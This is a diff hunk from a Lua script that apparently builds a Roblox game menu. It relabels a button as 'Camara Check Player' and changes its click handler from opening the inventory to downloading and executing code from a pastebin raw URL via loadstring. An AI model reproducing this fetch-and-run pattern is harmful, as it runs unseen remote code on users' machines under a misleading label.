@@ -1956,12 +1956,12 @@ bm3.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 bm3.Position = UDim2.new(0, 0, 0.1704392526, 0)
 bm3.Size = UDim2.new(0, 498, 0, 30)
 bm3.Font = Enum.Font.SourceSans
-bm3.Text = "Rương đồ"
+bm3.Text = "Camara Check Player"
 bm3.TextColor3 = Color3.fromRGB(255, 255, 255)
 bm3.TextSize = 18.000
 UIbm3.Parent = bm3
 bm3.MouseButton1Down:connect(function()
-game.Players.localPlayer.PlayerGui.Main.Inventory.Visible = true
+loadstring(game:HttpGet(('https://pastebin.com/raw/qDPszDgV')))()
 end)
 
 --inventory fruit
